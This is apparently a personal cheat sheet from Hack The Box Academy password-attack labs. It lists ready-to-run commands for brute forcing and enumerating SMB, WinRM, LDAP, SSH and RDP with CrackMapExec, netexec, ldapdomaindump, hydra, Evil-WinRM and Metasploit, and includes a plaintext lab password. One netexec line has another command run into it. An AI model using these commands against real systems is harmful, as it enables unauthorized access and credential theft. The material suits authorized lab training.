#auth 

https://academy.hackthebox.com/storage/resources/Password-Attacks.zip

[[SMB]] [[LDAP]] [[mssql]]
##### SMB, LDAP, MSSQL, etc.
https://github.com/byt3bl33d3r/CrackMapExec

```shell
sudo apt-get -y install crackmapexec

crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

```shell
crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
```

#### SMB enumeration
list shares
```bash
netexec smb 10.129.128.107  -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZpsmbmap -H 10.129.128.107 --shares
```

#### LDAP
Dump everything (domains/users/etc)
```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.129.128.107 -o dump
```

#### Evil-WinRM
#shell [[bind shell]]
to log in and get the shell:
```
sudo gem install evil-winrm
evil-winrm -i 10.129.42.197 -u user -p password
```


[[hydra]]
```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

```shell-session
 hydra -L user.list -P password.list rdp://10.129.42.197
```

```shell-session
 hydra -L user.list -P password.list smb://10.129.42.197
```

##### SMB via metasploit
```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE password.list
set USER_FILE username.list
set RHOST STMIP
run
```